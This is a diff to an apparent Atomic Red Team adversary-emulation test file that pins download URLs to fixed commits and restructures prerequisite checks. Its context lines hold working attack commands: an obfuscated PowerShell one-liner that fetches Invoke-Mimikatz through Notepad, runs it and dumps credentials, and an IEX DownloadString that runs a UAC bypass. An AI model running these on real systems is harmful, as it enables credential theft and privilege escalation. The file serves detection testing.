@@ -12,7 +12,7 @@ atomic_tests:
     mimurl:
       description: Mimikatz url
       type: url
-      default: https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
+      default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
   executor:
     name: command_prompt
     elevation_required: true
@@ -28,7 +28,7 @@ atomic_tests:
     bloodurl:
       description: BloodHound URL
       type: url
-      default: https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1
+      default: https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1
   executor:
     name: command_prompt
     elevation_required: false
@@ -58,7 +58,7 @@ atomic_tests:
     name: powershell
     elevation_required: true
     command: |
-      $url='https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
+      $url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
 
 - name: Invoke-AppPathBypass
   description: |
@@ -70,7 +70,7 @@ atomic_tests:
     name: command_prompt
     elevation_required: false
     command: |
-      Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
+      Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
 
 - name: PowerShell Add User
   description: |
@@ -203,11 +203,18 @@ atomic_tests:
     Attempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/
   supported_platforms:
     - windows
+
+  dependencies:
+  - description: |
+      PowerShell version 2 must be installed
+    prereq_command: |
+      if(2 -in $PSVersionTable.PSCompatibleVersions.Major) {0} else {1}
+    get_prereq_command: |
+      Write-Host  Automated installer not implemented yet, please install PowerShell v2 manually
+
   executor:
     name: powershell
     elevation_required: false
-    prereq_command: |
-      if(2 -in $PSVersionTable.PSCompatibleVersions.Major){0}else{1}
     command: |
       powershell.exe -version 2 -Command Write-Host $PSVersion
 
@@ -221,11 +228,18 @@ atomic_tests:
       description: File created to store Alternate Stream Data
       type: String
       default: $env:TEMP\NTFS_ADS.txt
+
+  dependencies:
+  - description: |
+       Homedrive must be an NTFS drive
+    prereq_command: |
+      if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem -contains "NTFS") {0} else {1}
+    get_prereq_command: |
+      Write-Host Prereq's for this test cannot be met automatically
+
   executor:
     name: powershell
     elevation_required: false
-    prereq_command: | # Checks to verify that $env:HOMEDRIVE is an NTFS drive
-      if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem -contains "NTFS"){0}else{1}
     command: |
       Add-Content -Path #{ads_file} -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
       $streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'
